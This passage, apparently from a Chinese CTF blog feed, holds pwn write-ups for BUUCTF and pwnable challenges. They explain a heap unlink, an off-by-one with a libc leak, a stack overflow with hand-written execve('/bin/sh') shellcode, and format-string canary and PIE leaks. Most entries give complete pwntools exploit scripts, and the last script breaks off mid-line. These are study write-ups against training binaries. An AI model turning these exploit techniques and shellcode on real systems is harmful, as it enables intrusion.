title="完整EXP"></a><strong>完整EXP</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28478)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改free_got -&gt; system_plt</span></span><br><span class="line">magic = <span class="number">0x6020C0</span> </span><br><span class="line">heaparray = <span class="number">0x6020E0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">bug()</span><br><span class="line"><span class="comment"># 构造fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1合并</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable系列</title>
      <link href="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/"/>
      <url>/2024/09/01/pwnable%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnable-start-32位"><a href="#pwnable-start-32位" class="headerlink" title="pwnable-start(32位)"></a>pwnable-start(32位)</h1><p><a href="https://buuoj.cn/challenges#pwnable_start">题目链接</a></p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p><font color="red"><strong>根据汇编看漏洞</strong></font></p><ul><li>直接看ida反汇编，发现看不懂：</li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901105731101.bmp"></p><ul><li>果断选择看汇编：</li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901105741003.bmp"></p><p><font size="4"><strong>根据汇编我们可以知道这里执行了两个函数：</strong></font></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x14</span>)</span><br><span class="line">read(<span class="number">3</span>,buf,<span class="number">0x3c</span>)</span><br></pre></td></tr></table></figure><ul><li>注意到最下面的add esp,0x14，我们可以知道<strong>栈空间只有0x14的长度，但是我们可以输入0x3c的长度</strong>，所以我们可以栈溢出，这就是通过汇编看漏洞。</li><li>我们将ret_address改为栈地址，并将栈地址写入shellcode，那么就可以getshell，接下来看如何泄露栈地址，并且如何手写shellcode。</li></ul><h4 id="gdb分析："><a href="#gdb分析：" class="headerlink" title="gdb分析："></a><font color="red">gdb分析：</font></h4><h4 id="1-泄露栈地址"><a href="#1-泄露栈地址" class="headerlink" title="1.泄露栈地址"></a>1.泄露栈地址</h4><ul><li>目前只有read和write函数可以调用，那么我们覆盖read的返回地址为sys_write上面mov ecx,esp；也就是会再次执行writed，然后将esp的地址输出出来。</li><li>栈地址rbp距离rsp是0x14,再将泄露的地址加上0x14就是栈地址了。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>) <span class="comment"># 就是mov ecx,esp;的地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure><ul><li><font size="4">此时栈溢出修改ret_address</font></li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901112556053.bmp"></p><ul><li><font size="4">泄露出栈地址：</font></li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901112801146.bmp"></p><h4 id="2-手写shellcode"><a href="#2-手写shellcode" class="headerlink" title="2.手写shellcode"></a>2.手写shellcode</h4><ul><li>我们可以写入0x3c的数据，除了0x14的垃圾数据和覆盖返回地址，还可以写入0x3c-0x18&#x3D;0x24的内容，用<strong>pwntools自动生成的shellcode长度是0x2c，发现是过长了的,所以我们要自己手写shellcode。</strong></li><li><fron size="4" color="red">如何手写？</fron></li></ul><p><strong>shellcode其实就是执行execve(‘&#x2F;bin&#x2F;sh’,0,0)</strong></p><ul><li><p><font size="4">eax &#x3D; 0xb <a href="https://blog.csdn.net/winter2121/article/details/119845443?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B732%E4%BD%8D&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-119845443.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">32位的系统调用号</a>execve是0xb</font></p></li><li><p><font size="4">ebx &#x3D; &#x2F;bin&#x2F;sh\x00</font></p></li><li><p><font size="4">ecx &#x3D; 0</font></p></li><li><p><font size="4">edx &#x3D; 0</font></p></li><li><p><font size="4">int 0x80</font></p></li></ul><p><strong>各个寄存器的数值就是这样的，我们手写的shellcode就要满足这些就行了，注意&#x2F;bin&#x2F;sh的小端序就行了</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;/bin/sh\x00&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;0068732f6e69622f&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # 将/bin/sh\x00入栈</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32位系统调用号</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901114138740.bmp"></p><ul><li>ok,执行了execve(‘&#x2F;bin&#x2F;sh‘，0，0)了，就getshell了</li></ul><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,25581)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入shellcode</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh()) 过长 </span></span><br><span class="line"><span class="comment"># 自己构造execve(&#x27;/bin/sh&#x27;,0,0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # 将/bin/sh\x00入栈</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32位系统调用号</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_heapcreator--简单堆利用</title>
      <link href="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-hitcontraining-heapcreator"><a href="#BUUCTF-hitcontraining-heapcreator" class="headerlink" title="BUUCTF-hitcontraining_heapcreator"></a>BUUCTF-hitcontraining_heapcreator</h1><ul><li><p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">题目链接</a></p></li><li><p>glibc2.24</p></li></ul><p><font size="4"><strong>很明显的堆菜单题目</strong></font></p><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/%E6%80%BB%E8%A7%88.bmp"></p><ul><li><font size="4" color="red"><strong>menu</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/menu.bmp"></p><ul><li><font size="4" color="red"><strong>create_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/add.bmp"></p><ul><li><font size="4" color="red"><strong>delete_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/delete.bmp"></p><ul><li><font size="4" color="red"><strong>edit_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/edit.bmp"></p><ul><li><font size="4" color="red"><strong>show_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/show.bmp"></p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><font color="red">分析：</font></h3><ul><li>各个功能块都展示完了，发现在edit_heap有一个**<font color="red">off_by_one漏洞，那么我们可以修改下一个chunk的size**</font></li><li>将其free掉,再add回来，就可以修改chunk的内容，注意到show_heap是一个**%s + 地址**，那么我们将其填入free_got，就可以得到free的真实地址，从而泄露libc，获得system，但是光system不够啊。</li><li>再注意到delete_heap,是free(地址),我们将<strong>free_got -&gt; system</strong>，再在那个地址填入<strong>b’&#x2F;bin&#x2F;sh\x00’</strong>,就可以getshell了</li><li>具体思路就这些了，来看gdb调试的：</li></ul><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a><font color="red">gdb调试</font></h3><p><font size="4" color="red">1.申请三次chunk</font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6个chunk</span></span><br><span class="line">bug()</span><br></pre></td></tr></table></figure><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/1.bmp"></p><ul><li>调用了三次create_heap,有6个chunk,看看其内容是什么</li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/2.bmp"></p><p>可以猜测，相比于正常的chunk结构，这里前面多了一个chunk的结构体，记录了其size和user_data_address</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span>* heaparray[i] <span class="comment">// 大概意思 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font size="4" color="red"><strong>2.利用off_by_one修改size</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/3.bmp"></p><ul><li>从箭头处,也就是data处填入数据，往heaparray[0]处地址写入&#x2F;bin&#x2F;sh，修改chunk1结构体size,<strong>使得下方0x70的内容被合并为一个chunk</strong>，之后的free和malloc都会被当成一个chunk处理</li></ul><p><font size="4" color="red"><strong>3.add修改show部分的地址为free_got，泄露libc</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> 此时<span class="number">1</span>,<span class="number">2</span>合并，修改<span class="number">2</span>号chunk_data为free_got，show出来泄漏真实地址</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x8</span>) + p64(free_got) <span class="comment">#0x8记录的是chunk2的size，也是后面edit的长度，0x8,0x10都可以</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/4.bmp"></p><ul><li>对于chunk2,也就是heaparray[2]来说，它的内容已经更改，show的时候就是show(0x602018)，也就是将free_got指向的内容给输出出来，也就是输出free的真实地址</li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/6.bmp"></p><ul><li>此时的heaparray内容如上，因此show可以将free真实地址show出来</li></ul><p><font size="4" color="red"><strong>4.修改free_got-&gt;system，然后执行free</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27902)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>): <span class="comment"># off_by_one</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6个chunk</span></span><br><span class="line"><span class="comment"># bug()</span></span><br><span class="line"><span class="comment"># 利用off_by_one修改size</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时1,2合并，修改2号chunk_data为free_got，show出来泄漏真实地址</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x10</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>在分析各个功能块的时候就要有想法，简单堆题一定要对地址掌握收悉。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE保护</title>
      <link href="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/"/>
      <url>/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h1><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>参考：<a href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq+W5q5Mf+bD#toc-0">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0</a></p><p><font size="4" color="red">pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的</font></p><ul><li>从ida来看，地址基本都是<strong>四位数</strong>，如下：</li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp"></p><ul><li>差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给出来的只是偏移地址。</li></ul><p><font size="4" color="red">程序的实际运行地址 &#x3D; 程序加载基址 + 程序偏移地址</font></p><ul><li><fron color="red">注意：即使开启了pie，真实地址和ida中所看到的偏移地址的末三位数字肯定还是一样的，这是由于内存页对其的原理。</fron></li></ul><h3 id="关于开启pie的gdb调试"><a href="#关于开启pie的gdb调试" class="headerlink" title="关于开启pie的gdb调试"></a>关于开启pie的gdb调试</h3><ul><li><strong>指令</strong>：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b *$rebase(偏移地址) <span class="comment"># 偏移地址从ida看</span></span><br></pre></td></tr></table></figure><ul><li>注意程序要先run起来，才可以打断点</li></ul><h3 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h3><h3 id="1-深育杯-2021-find-flag-格式化字符串-pie"><a href="#1-深育杯-2021-find-flag-格式化字符串-pie" class="headerlink" title="1.[深育杯 2021]find_flag(格式化字符串-pie)"></a>1.<strong>[深育杯 2021]find_flag</strong>(格式化字符串-pie)</h3><p><a href="https://www.nssctf.cn/problem/774">题目地址</a></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp"></p><ul><li><strong>保护全开直接看ida</strong></li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p><ul><li><strong>很明显的格式化字符串漏洞，先泄露canary和pie基地址，然后栈溢出到后门函数就可以了</strong> (此题有后门函数)</li></ul><p><font size="5" color="red"><strong>gdb调试查找泄露偏移</strong></font></p><ul><li>在格式化字符串漏洞那里下断点：</li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p><ul><li>先让程序start，然后如上面下断点，查看栈结构</li><li><strong>rbp上方的就是canary</strong>, 距离rsp偏移是11，看最左侧也可以看出来，0xb，再加上6个寄存器(64位),偏移地址是17</li><li>如何泄露pie地址，我们要得到一个<strong>既可以在ida中可以查看偏移的地址，也可以泄露出其真实地址的地方</strong>， 正如下方,偏移位0x146f的地方,泄露这个地方的地址，减去0x146f，就可以得到pie的基地址了。</li><li><font color="red">注意：ROPgadget看到的地址也只是偏移地址，要加上pie的基地址后才可以使用：</font></li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28406</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串泄露canary和pie基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%17$p-%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x146F</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 